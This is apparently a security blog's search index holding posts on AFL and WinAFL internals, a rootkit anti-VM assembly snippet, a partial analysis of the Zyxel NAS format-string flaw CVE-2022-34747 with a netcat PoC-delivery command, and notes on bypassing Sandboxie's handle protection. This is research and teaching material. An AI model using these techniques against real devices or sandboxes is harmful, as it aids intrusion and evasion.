<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>afl-fuzz源码分析</title>
    <link href="/2023/05/01/afl-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/05/01/afl-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="afl-fuzz源码分析"><a href="#afl-fuzz源码分析" class="headerlink" title="afl-fuzz源码分析"></a>afl-fuzz源码分析</h1><h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><p>afl-gcc本身是编译器的封装,通过afl的一些环境变量,设置一些gcc的编译选项,如asan,msan,编译器优化等.</p><h5 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a><strong>全局变量</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8*  as_path;                <span class="hljs-comment">/* Path to the AFL &#x27;as&#x27; wrapper      */</span><br><span class="hljs-type">static</span> u8** cc_params;              <span class="hljs-comment">/* Parameters passed to the real CC  */</span><br><span class="hljs-type">static</span> u32  cc_par_cnt = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* Param count, including argv0      */</span><br><span class="hljs-type">static</span> u8   be_quiet,               <span class="hljs-comment">/* Quiet mode                        */</span><br>            clang_mode;             <span class="hljs-comment">/* Invoked as afl-clang*?            */</span><br></code></pre></td></tr></table></figure><p>as_path:afl-as的路径</p><p>cc_params:调用gcc或者clang的参数</p><p>cc_par_cnt:gcc clang参数数量</p><p>be_quiet:默认模式</p><p>clang_mode:是否使用afl-clang</p><h5 id="main"><a href="#main" class="headerlink" title="main"></a><strong>main</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;<br><br>    SAYF(cCYA <span class="hljs-string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span><br>         <span class="hljs-string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span><br>         <span class="hljs-string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span><br>         <span class="hljs-string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span><br>         <span class="hljs-string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span><br>         <span class="hljs-string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,<br>         BIN_PATH, BIN_PATH);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  find_as(argv[<span class="hljs-number">0</span>]);<br><br>  edit_params(argc, argv);<br><br>  execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)cc_params);<br><br>  FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>主要功能集中在find_as,edit_params函数,最后执行execvp</p><h5 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h5><p>函数功能是寻找”fake” gcc汇编程序,实际上是通过环境变量”AFL_PATH”或者afl-gcc的当前执行目录寻找afl-as的路径.</p><h5 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h5><p>函数功能是,将argv的参数复制到cc_params,以及做一些参数的处理.</p><p>首先alloc一个(argc+128)*8字节大小的内存</p><p>1.检查当前执行程序名是否为afl-clangxx,如果是</p><p>​clang_mode&#x3D;1,表示使用afl-clang模式</p><p>​如果是clang++</p><p>​尝试获取AFL_CXX环境变量.或者使用默认值”clang++”,赋值给cc_params[0]</p><p>​如果不是clang++</p><p>​尝试获取AFL_CC环境变量.或者使用默认值”clang”,赋值给cc_params[0]</p><p>如果不是afl-clangxx,会认为是apple平台并做一些处理,这里不做赘述.</p><p>2.while循环,遍历argv[1]和之后的参数,做一些处理.</p><p>参数:-B是否指定了汇编器afl-as的路径,如果是默认模式,直接跳过.</p><p>参数:-integrated-as和-pipe 直接跳过不做处理.</p><p>参数:-fsanitize&#x3D;address和-fsanitize&#x3D;memory,gcc的编译选项,LLVM的组件Asan,将asan_set&#x3D;1,这两个参数是Asan用于检测内存访问越界,内存泄露问题的.如果编译时插入一些安全检查,需要记录和跟踪信息,可以加上.</p><p>参数:FORTIFY_SOURCE,将fortify_set &#x3D; 1,gcc编译时会在一些容易出现漏洞的函数插入一些安全检查,如memcpy,strcpy…</p><p>3.while结束,对前面做的一些标记做参数处理.</p><p>-B as_path,find_as里面寻找到的afl-as路径.</p><p>clang_mode为1 设置-no-integrated-as</p><p>如果环境变量存在AFL_HARDEN.设置gcc -fstack-protector-all和-D_FORTIFY_SOURCE&#x3D;2,这个afl的编译选项,会开启一些编译时的安全保护.<br>如果asan_set为1,设置了些编译时的内存错误检测,设置环境变量AFL_USE_ASAN为1</p><p>编译选项asan和msan相关的,添加这些编译选项,利于内存错误的分析</p><p>一些获取环境变量AFL_USE_ASAN,AFL_USE_MSAN,AFL_HARDEN,设置了一些-U_FORTIFY_SOURCE和-fsanitize&#x3D;memory参数,只是此处AFL_USE_ASAN和AFL_USE_MSAN不能同时设置,因为使用asan和msan编译同一源代码时,会对运行速度造成影响,afl-fuzz可能会觉得会fuzz效率有影响??</p><p>编译器优化相关,添加这些编译选项,禁止某些优化,利于afl-fuzz更好的探测一些漏洞,但是程序会变慢,可能会对fuzz效率造成影响.</p><p>获取环境变量AFL_DONT_OPTIMIZE,存在</p><p>设置gcc编译选项-g -O3 -funroll-loops -D__AFL_COMPILER&#x3D;1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION&#x3D;1</p><p>编译器内置函数优化相关的一些编译选项,内置函数可能不安全,禁用可能会导致程序变慢.</p><p>获取环境变量AFL_NO_BUILTIN,存在</p><p>一些函数不使用编译器内置的,如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strcmp&quot;</span>;<br>cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strncmp&quot;</span>;<br>cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strcasecmp&quot;</span>;<br>cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strncasecmp&quot;</span>;<br>cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-memcmp&quot;</span>;<br>cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strstr&quot;</span>;<br>cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-fno-builtin-strcasestr&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>winafl搭建</title>
    <link href="/2023/04/26/winafl%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/04/26/winafl%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="winafl搭建"><a href="#winafl搭建" class="headerlink" title="winafl搭建"></a>winafl搭建</h1><p>对winafl的搭建做个记录.</p><p>1.从github上拉取DynamoRIO,这里可以直接下载release编译好的,自己编译需要安装active perl</p><p>,不然没法编译,还挺麻烦的.</p><p>release:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DynamoRIO/</span>dynamorio<span class="hljs-regexp">/releases/</span><br></code></pre></td></tr></table></figure><p>自己编译DynamoRIO,拉取源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DynamoRIO/</span>dynamorio.git<br></code></pre></td></tr></table></figure><p>下载安装perl</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.activestate.com<span class="hljs-regexp">/products/</span>perl/<br></code></pre></td></tr></table></figure><p>打开Developer Command Prompt for VS 2019,根据你自己的vs版本</p><p>编译32位版本,</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mkdir build32 &amp; <span class="hljs-keyword">cd</span> build32<br>cmake -A Win32 <span class="hljs-string">..</span><br>cmake <span class="hljs-params">--build</span> . <span class="hljs-params">--config</span> RelWithDebInfo<br></code></pre></td></tr></table></figure><p>编译64位版本</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mkdir build64 &amp; <span class="hljs-keyword">cd</span> build64<br>cmake -A x64 <span class="hljs-string">..</span><br>cmake <span class="hljs-params">--build</span> . <span class="hljs-params">--config</span> RelWithDebInfo<br></code></pre></td></tr></table></figure><p>2.从github上拉取winafl</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone --recursive https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/googleprojectzero/</span>winafl<br></code></pre></td></tr></table></figure><p>编译winafl,32位,这里-DDynamoRIO_DIR要更改为刚刚编译好的目录</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">mkdir <span class="hljs-keyword">build32</span><br><span class="hljs-keyword"></span>cd <span class="hljs-keyword">build32</span><br><span class="hljs-keyword"></span>cmake -G<span class="hljs-string">&quot;Visual Studio 16 2019&quot;</span> -A Win32 .. -DDynamoRIO_DIR=yourpath dynamorio\<span class="hljs-keyword">build32\cmake</span><br><span class="hljs-keyword"></span>cmake --<span class="hljs-keyword">build </span>. --<span class="hljs-built_in">config</span> Release<br></code></pre></td></tr></table></figure><p>64位</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">mkdir <span class="hljs-keyword">build64</span><br><span class="hljs-keyword"></span>cd <span class="hljs-keyword">build64</span><br><span class="hljs-keyword"></span>cmake -G<span class="hljs-string">&quot;Visual Studio 16 2019&quot;</span> -A x64 .. -DDynamoRIO_DIR=yourpath dynamorio\<span class="hljs-keyword">build64\cmake</span><br><span class="hljs-keyword"></span>cmake --<span class="hljs-keyword">build </span>. --<span class="hljs-built_in">config</span> Release<br></code></pre></td></tr></table></figure><p>如果你的vs是其他版本,要注意编译命令是有些区别的</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">cmake -G <span class="hljs-string">&quot;Visual Studio 16 2019&quot;</span> -A Win<span class="hljs-number">32</span>   <span class="hljs-comment">;x32</span><br>cmake -G <span class="hljs-string">&quot;Visual Studio 16 2019&quot;</span> -A <span class="hljs-keyword">x</span><span class="hljs-number">64</span>     <span class="hljs-comment">;x64  默认架构为Win64</span><br>cmake -G <span class="hljs-string">&quot;Visual Studio 15 2017&quot;</span>            <span class="hljs-comment">;x32  默认架构为Win32</span><br>cmake -G <span class="hljs-string">&quot;Visual Studio 15 2017 Win64&quot;</span>      <span class="hljs-comment">;x64</span><br></code></pre></td></tr></table></figure><p>编译好的exe在build32\bin\Release目录下.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Rootkit和BootKit读书笔记</title>
    <link href="/2023/04/18/Rootkit%E5%92%8CBootKit%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/04/18/Rootkit%E5%92%8CBootKit%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="Anti-Virtual技术"><a href="#Anti-Virtual技术" class="headerlink" title="Anti-Virtual技术"></a>Anti-Virtual技术</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,&#x27;VMXh&#x27;<br>mov ebx, 0<br>mov ecx,0Ah,<br>mov edx,&#x27;VX&#x27;,<br>in eax,dx<br></code></pre></td></tr></table></figure><p>经测试,在in eax,dx时会直接异常.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Zyxel Nas漏洞分析与利用 cve-2022-34747</title>
    <link href="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="tags"><a href="#tags" class="headerlink" title="tags:"></a>tags:</h2><h1 id="CVE-2022-34747-漏洞分析与利用"><a href="#CVE-2022-34747-漏洞分析与利用" class="headerlink" title="CVE-2022-34747 漏洞分析与利用"></a>CVE-2022-34747 漏洞分析与利用</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>该漏洞于2022-09-06披露,Zyxel NAS326固件版本的格式字符串漏洞,允许攻击者通过精心制造的UDP数据包实现RCE.</p><h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2><p> 该漏洞已在新版本固件中被修复,不过在官网下载中心还可以下载到有漏洞的固件版本用于分析.</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230302160418943.png" alt="image-20230302160418943"></p><p>NAS326的设备固件上次更新是在1年多前了,版本不连续,不利于对比分析.</p><p>所以换成NAS540设备的固件列表看看,发现NAS540的漏洞临界版本是在1个月前更新的,所以选择这两个固件进行对比分析,定位漏洞模块.</p><p>V5.21(AATB.8)</p><p>V5.21(AATB.9)</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230302160616277.png" alt="image-20230302160616277"></p><p> NAS540</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230302160744481.png" alt="image-20230302160744481"></p><p>下载固件后使用binwalk命令对固件进行解包,得到如下结构.其实解包之后,差别特别明显,漏洞修复版本直接去掉了nsuagent这个程序,在其他的路径中也没有找到.(多出来的etc,lib是我后面修复动态链接库创建的)</p><p>AATB.8</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230302161342337.png" alt="image-20230302161342337"></p><p>AATB.9</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230302161433398.png" alt="image-20230302161433398"></p><p>由于是格式化字符串漏洞,所以主要需要定位一些格式字符处理的相关函数,在导入函数里面查找到了如下调用,通过交叉引用发现了此处的格式化字符串处理问题.</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230302165914910.png" alt="image-20230302165914910"></p><p>这是一个日志处理的函数,会将生产的日志信息,格式化后写入本地文件中,但是问题是这里的格式化字符串可控的.如果日志信息也可控,这里就是一个漏洞.</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303101402314.png" alt="image-20230303101402314"></p><p> 在sub_1aee4中,可以看到用户名密码的日志信息通过调用此函数被生产,是可以引起漏洞的一个位置.</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303102123573.png" alt="image-20230303102123573"></p><p>下面开始分析程序的执行流程,如何执行到这个位置.</p><p>在main函数中,会获取参数”p:xxxx”,然后调用sub_19a80-&gt;sub_15408,其中会加载2个路径下的文件</p><p>&#x2F;etc&#x2F;apche&#x2F;pubkey.pem</p><p>&#x2F;etc&#x2F;apche&#x2F;testkey.pem</p><p>如果加载失败,会直接退出程序,导致流程无法继续,所以在后面调试漏洞时,要在这个路径放置证书文件.</p><p>调用成功后,将获取到的参数p:使用atoi函数转换为整形.最终调用sub_1aee4.</p><p><img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303105818447.png" alt="image-20230303105818447"></p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303104458317.png" alt="image-20230303104458317"></p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303104056715.png" alt="image-20230303104056715"></p><p>sub_1aee4-&gt;sub_159f8中会将传入的参数p,作为用于udp通信的端口.</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303110155300.png" alt="image-20230303110155300"></p><p>然后接收长度最大为0x10d8长度的数据包,接收数据包之后通过sub_1bc48对数据包的格式进行了验证.</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303111024318.png" alt="image-20230303111024318"></p><p>验证的步骤:</p><p>1.数据包的前两个字节左移8位,然后或运算前2个字节,判断结果是否为0x42</p><p>2.数据包的偏移0xA的2字节数据左移8位,然后或运算偏移0xA处2字节的高位,判断结果是否大于0xC</p><p>通过后返回偏移为3处的数据</p><p>3.在此函数外部,对偏移为3处数据进行了判断,如果为0x41,才会结束当前循环,停止继续接收数据,向下处理.</p><p>  <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303140825431.png" alt="image-20230303140825431"></p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303142600996.png" alt="image-20230303142600996"></p><p>后面还有几处验证,比较简单</p><p>判断字符串中是否有参数</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303144607984.png" alt="image-20230303144607984"></p><p> 一些固定数据的判断</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303144635166.png" alt="image-20230303144635166"></p><p>分析到此处,开始通过调试的方式辅助分析验证.</p><p>程序是arm架构的,使用qemu-arm模拟器创建调试端口配合ida动态调试.</p><p>首先要手动建立好软链接(这一步或许可以通过脚本实现?)</p><p>而后要创建前面所说的2个证书文件,都可以在解包后的文件中找到.</p><p><img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230202200556786.png" alt="image-20230202200556786"></p><p>通过命令创建调试端口,指定udp通信端口为1111</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-arm -g 7777 -L ./ nsuagent &quot;-p 1111&quot;<br></code></pre></td></tr></table></figure><p>运行至此处后,需要构造一个UDP数据包给漏洞程序接收</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303145551014.png" alt="image-20230303145551014"></p><p>构造POC如下,使用此命令发送</p><p> <img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230303144303673-1678088758775-1.png" alt="image-20230303144303673"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;$(&lt;/root/桌面/poc)&quot; |nc -vu 192.168.164.129 1111<br></code></pre></td></tr></table></figure><p>该程序开启了dep保护,需要在栈中构造rop进行利用.</p><p><img src="/2023/03/06/nas%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230127170119545.png" alt="image-20230127170119545"></p><p>&#x2F;&#x2F;todo rop构造</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SandboxIE源码分析</title>
    <link href="/2022/12/27/SandboxIE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2022/12/27/SandboxIE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="1-内核回调"><a href="#1-内核回调" class="headerlink" title="1.内核回调"></a>1.内核回调</h1><p><strong>SbieDrv.sys SbieDll.dll</strong> </p><p><strong>目录结构:</strong></p><p><strong>Apps:窗口UI相关</strong></p><p><strong>Com:对于一些com组件的隔离</strong></p><p>​    <strong>SandBoxBITS:          后台智能传输服务的隔离</strong></p><p>​    <strong>SandBoxCrypto:        认证服务的隔离</strong></p><p>​    <strong>SandBoxRpcSs:rpc       服务的隔离</strong></p><p>​    <strong>SandBoxWUAU:         更新服务的隔离</strong></p><p>​    <strong>SboxDcomLaunch:Dcom  服务的隔离</strong></p><p><strong>Core:核心功能实现</strong></p><p>​    <strong>SboxDrv:              注册一些回调,隔离的控制,权限控制,注入,通信..</strong></p><p>​    <strong>SboxHostDll:           注入器</strong></p><p>​    <strong>SboxDll:               应用层注入Dll</strong></p><p><strong>Common:</strong></p><p><strong>Parse:</strong></p><p><strong>SboxMsg:</strong></p><p><strong>维护了一个沙箱程序链表proc</strong></p><p><strong>PsSetCreateProcessNotifyRoutine</strong> <strong>进程创建回调:</strong></p><p><strong>判断是否应作为沙箱进程,防止沙箱逃逸.Dll的注入</strong></p><p>判断沙箱主进程是否初始化完毕,未初始化完成,不做处理.</p><p>传入参数:分配的进程id,创建该进程的父进程id,创建该进程的进程id</p><p>CreateInfo-&gt;ParentProcessId, PsGetCurrentProcessId()都要传,因为通过RtlCreateUserProcess父进程是可以指定的.</p><p>会加大溯源难度,这里一定要传一个PsGetCurrentProcessId(),需要注意的是在回调中PsGetCurrentProcessId()存储的是真实的父进程id,后续进行正确的判断,否则脱离沙箱管控,会带来沙箱逃逸问题..</p><p>获取进程完整路径</p><p>判断ParentId是否由沙箱所创建,如果是,将标志位add_process_to_job(由沙箱管理的进程标识)修改为true.</p><p>如果不是,则继续判断PsGetCurrentProcessId()获取的id是否是一个由沙箱管控的进程.</p><p>如果不是,则继续判断是否为一个强制沙箱模式运行的进程.</p><p>强制进程:设置中进行配置,某些进程强制在沙箱下运行.,</p><p>默认配置为:iexplore.exe firefox.exe App*.exe App?.exe outlook.exe cl?cke?.exe</p><p>如果是一个force_process,则通过函数<em>Process_GetForcedStartBox**在沙盒下运行,add_process_to_job修改为true.</em></p><p>代码的注入</p><p>当检查通过后,确定是一个应被沙盒化的进程</p><p>调用Process_Low_Inject进行dll的注入.,它这里的注入是通知ring3应用程序进行了跨进程的一个远程线程注入.由于session0隔离限制,</p><p>某些进程是无法这样注入的,虽然可以绕过.</p><p>这部分逻辑其实可以在ring0实现.通过挂靠进程,然后向ZwTestAlert函数头部写入shellcode完成dll的加载</p><p><strong>PsSetLoadImageNotifyRoutine</strong> <strong>模块加载回调</strong></p><p><strong>沙盒空间的初始化</strong></p><p>跳过系统映像,通过判断processId是否为0和ImageInfo中的SystemModeImage字段.</p><p>如果加载了32位ntdll,会将32位ntdll的基址记录于proc-&gt;ntdll32_base</p><p>创建沙盒空间,沙盒的初始化相关操作.文件,注册表..</p><p><strong>ObRegisterCallbacks</strong> <strong>对象回调</strong></p><p><strong>主要要做的工作是句柄沙箱进程与主机进程之间句柄权限的管理.</strong></p><p>对于内核句柄,不做操作.</p><p>对于进程句柄,线程句柄的处理:</p><p>​    如果打开的进程句柄的进程id,是当前进程,忽略.</p><p>​    如果打开句柄的操作不来自沙箱,但是主机进程的目标是沙盒进程</p><p>​    将句柄修改为无权限. <em>PROCESS_DENIED_ACCESS_MASK**或者THREAD_DENIED_ACCESS_MASK</em></p><p>​    如果沙箱不是机密的,则会放出一些进程的访问权限,csrss.exe conhost.exe taskmgr.exe sandman.exe.</p><p>​    它这里实现的较为简单,如果将shellcode注入到这些进程里面,可以很简单的绕过.</p><p>​    如果打开句柄的操作来自沙箱进程,目标也是沙箱进程,允许.</p><p>​    如果访问的是外部主机进程,则通过用户配置判断是否将句柄修改为无权限.并记录跨沙箱访问记录.</p><h1 id="2-服务"><a href="#2-服务" class="headerlink" title="2.服务"></a>2.服务</h1><h4 id="1-scm-c"><a href="#1-scm-c" class="headerlink" title="1.scm.c"></a>1.scm.c</h4><h5 id="Scm-Init-AdvApi"><a href="#Scm-Init-AdvApi" class="headerlink" title="Scm_Init_AdvApi"></a>Scm_Init_AdvApi</h5><p>hook安装</p><p>执行Scm_Notify_Init 安装NotifyServiceStatusChange回调</p><p>执行Scm_HookRegisterServiceCtrlHandler</p><h5 id="Scm-Notify-Init"><a href="#Scm-Notify-Init" class="headerlink" title="Scm_Notify_Init"></a>Scm_Notify_Init</h5><p>NotifyServiceStatusChange此回调在vista和更高版本中可用.</p><p>所以在高版本下,sbie hook了此函数.</p><h5 id="Scm-HookRegisterServiceCtrlHandler"><a href="#Scm-HookRegisterServiceCtrlHandler" class="headerlink" title="Scm_HookRegisterServiceCtrlHandler"></a>Scm_HookRegisterServiceCtrlHandler</h5><p>内部声明了2个7字节的opcode,</p><p>64位下7字节覆盖掉了原代码.</p><p> <img src="/2022/12/27/SandboxIE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20221019100811727.png" alt="image-20221019100811727"></p><p>其他情况默认hook.</p><h5 id="Scm-OpenSCManagerW"><a href="#Scm-OpenSCManagerW" class="headerlink" title="Scm_OpenSCManagerW"></a>Scm_OpenSCManagerW</h5><p>对当前线程token进行检查,如果没有查询到token,并且当前进程标识是受限制的,则无权限.这里这个标识为默认是可以不受限的.</p><p>获取到token,检查此token是否在受限制的组中.通过函数NtQueryInformationToken 获取到的受限sid列表如果大于0则直接返回无权限.</p><p>这个函数实际返回的是自定义的虚拟句柄,自定义的返回值</p><p>#define HANDLE_SERVICE_MANAGER          ((SC_HANDLE)0x12340001)<br>#define HANDLE_SERVICE_STATUS           ((SERVICE_STATUS_HANDLE)0x12340003)<br>#define HANDLE_SERVICE_LOCK           ((SC_LOCK)0x12340005)<br>#define HANDLE_EVENT_LOG                ((SC_LOCK)0x12340007)</p><h5 id="Scm-OpenServiceW"><a href="#Scm-OpenServiceW" class="headerlink" title="Scm_OpenServiceW"></a>Scm_OpenServiceW</h5><p>判断通过Scm_OpenSCManagerW获取到的handler值是否为HANDLE_SERVICE_MANAGER,如果不是,返回无权限.而后进行了一些参数判断.</p><p>检查此服务是否在沙盒中</p><p>直接调用函数CreateKey返回句柄.</p><p>如果不在沙盒中.</p><p>向sbiesvc通信查询该服务具体信息,不从本进程查询,可以确定是无法确定当前沙盒进程的权限,有些api无法直接使用,所以借助sbiesvc调用函数查询服务信息.如果查询得到信息,构造一个serviceName查询不到,返回0.对服务名做了一个拼接处理sbox+服务名,之后作为句柄直接返回.</p><p> <img src="/2022/12/27/SandboxIE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20221019110826671.png" alt="image-20221019110826671"></p><h5 id="Scm-CloseServiceHandle"><a href="#Scm-CloseServiceHandle" class="headerlink" 